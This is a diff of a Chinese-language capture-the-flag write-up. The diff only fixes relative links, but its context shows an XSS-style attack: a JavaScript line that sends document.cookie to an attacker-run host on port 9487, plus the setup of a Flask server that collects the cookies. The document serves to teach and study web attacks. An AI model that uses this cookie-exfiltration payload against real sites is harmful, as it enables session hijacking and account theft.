@@ -48,7 +48,7 @@ Writeup By: **yctseng1227**、**stavhaygn**
 因此配合前面提到的 `Meow me` ，我們可以對剛檔案做一些壞壞的事^~^+
 
 
-[m.meow]()
+[m.meow](./m.meow)
 ```
 document.location='http://140.117.xxx.xxx:9487/?c=' + document.cookie;
 /*
@@ -64,7 +64,7 @@ PK...
 
 既然有了檔案在官方伺服器的位置，那我們也能夠利用 `Meow me` 輸入JS code去觸發該檔案讓其執行`m.meow`內的JS code（示意圖如下）。
 
-![](02.png)
+![](./02.png)
 
 作為Web初學者，下方也說明一下如何快速自建伺服器。
 
@@ -76,7 +76,7 @@ $ sudo pip3 install flask_cors
 $ python3 app.py
 ```
 
-[app.py]()
+[app.py](./app.py)
 ```python
 from flask import Flask, request
 from flask_cors import CORS
